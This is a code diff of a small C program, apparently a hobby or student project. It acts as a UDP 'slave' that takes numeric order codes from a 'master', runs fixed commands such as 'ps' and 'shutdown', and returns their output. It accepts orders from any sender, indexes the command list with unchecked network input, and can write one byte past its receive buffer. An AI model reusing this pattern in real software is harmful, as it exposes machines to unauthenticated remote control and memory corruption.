@@ -3,22 +3,23 @@
 #include <stdlib.h>
 #include <stdio.h>
 
+#include <errno.h>
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <unistd.h>
+#include <string.h>
 
-#define BUFFER_SIZE 1024
-#define IN_PORT 42333
-#define OUT_PORT 42666 //two sockets to simulate communication on the same computer
+#define BUFFER_LEN 1024
+#define PORT 42666
 
 #define CHKERR(X) \
-	if ((X) < 0) \
-  	{ \
-		perror(#X); \
-		exit(errno); \
-	}
+    if ((X) < 0) \
+    { \
+        perror(#X); \
+        exit(errno); \
+    }
 
 
 enum status {
@@ -28,16 +29,55 @@ enum status {
 
 enum status curr_status = ACTIVE;
 
-char orders[2] = {"ls", "shutdown"};
+char *orders[2] = {"ps", "shutdown"};
+
+char exec_buff[BUFFER_LEN];
+size_t exec_len;
+
+void exec_order(int order_code) {//, char *buffer, ssize_t len) {
+    char* order = orders[order_code];
+    printf("executing order %i : %s\n", order_code, order);
+
+    char *args[2];//len+1];
+
+    args[0] = order;
+    //args[len-1] = "> toto.txt";
+    args[1] = NULL;
+    /*int start = 1;
+    int j = 1;
+    //slice arguments
+    for (int i = 1; i < len-1; ++i) {
+        if (buffer[i] == ';') {
+            int length = i - start;
+            args[j] = malloc(length * sizeof(char));
+            strncpy(args[j], buffer + start, (size_t) length);
+            start = i + 1;
+            printf("args[%i] = %s\n", j, args[j]);
+            j++;
+        }
+    }*/
+
+    fflush(stdin);
+    fflush(stdout);
+    FILE* pipe = popen(order, "r");
+    if (pipe == NULL) {
+        perror("popen failed");
+        exit(EXIT_FAILURE);
+    }
 
 
-void* exec_order(int order) {
-    printf("executing order %i : %s\n", order, orders[order]);
-    exec(orders[order]);
+    exec_len = fread(exec_buff, sizeof(char), sizeof(exec_buff), pipe);
+    int err = ferror(pipe);
+    if (err != 0) {
+        perror("fread");
+        exit(err);
+    }
+
+    pclose(pipe);
 }
 
-int main() {
-    /* need to read the doc about this shit
+int main(int argc, char *argv[]) {
+    /* need to read the doc about this
     jsmn_parser parser;
 
     jsmn_init(&parser);
@@ -51,41 +91,58 @@ int main() {
     }
      */
 
-
+    struct sockaddr_in slave_info, master_info;
+    /*
+    master_info.sin_family = AF_INET;
+    master_info.sin_port = htons(PORT);
+    master_info.sin_addr.s_addr = inet_addr("127.0.0.1");
+    */
 
     int sock;
+    socklen_t master_info_len = sizeof(master_info);
+    ssize_t recv_len;
+    char buffer[BUFFER_LEN];
+
+
     CHKERR(sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP));
 
+    // zero out the structure
+    memset((char *) &slave_info, 0, sizeof(slave_info));
 
-    char buffer[1024];
+    slave_info.sin_family = AF_INET;
+    slave_info.sin_port = htons(PORT);
+    slave_info.sin_addr.s_addr = inet_addr(argv[1]);
 
-    struct sockaddr_in to = { 0 };
-    int to_size = sizeof to;
 
-    to.sin_addr = *(struct in_addr *) ;
-    to.sin_port = htons(IN_PORT);
-    to.sin_family = AF_INET;
+    CHKERR(bind(sock, (struct sockaddr*)&slave_info, sizeof(slave_info) ));
 
-    int received;
-
-    while (!exit) {
-        switch(curr_status) {
+    while (curr_status != STOPPED) {
+        switch (curr_status) {
             case ACTIVE:
-                CHKERR((received = recvfrom(sock, buffer, BUFFER_LENGTH - 1, 0, (struct sockaddr *) &to, &to_size)) < 0);
-                buffer[received] = '\0';
+                printf("waiting for data\n");
 
-                if (received > 0) {
-                    exec_order(buffer[0]);
-                    CHKERR(sendto(sock, buffer, BUFFER_lENGTH, 0, (struct sockaddr *) &to, to_size));
+                CHKERR((recv_len = recvfrom(sock, buffer, BUFFER_LEN, 0,
+                                            (struct sockaddr *) &master_info, &master_info_len)));
+                buffer[recv_len] = '\0';
+
+                printf("received data : '%s'\n", buffer);
+                if (recv_len > 0) {
+                    if (strcmp(&buffer[0], "9") == 0) {
+                        curr_status = STOPPED;
+                        close(sock);
+                    } else {
+                        int order_code = atoi(&buffer[0]);
+                        exec_order(order_code);//, buffer, recv_len+1);
+                        printf("order returned :\n%s", exec_buff);
+
+                        CHKERR(sendto(sock, exec_buff, sizeof(exec_buff), 0, (struct sockaddr *) &master_info, master_info_len));
+                    }
                 }
-
                 break;
-            case STOPPED:
-                close(sock);
             default:
                 close(sock);
                 break;
         }
-
+        //sleep(1);
     }
 }
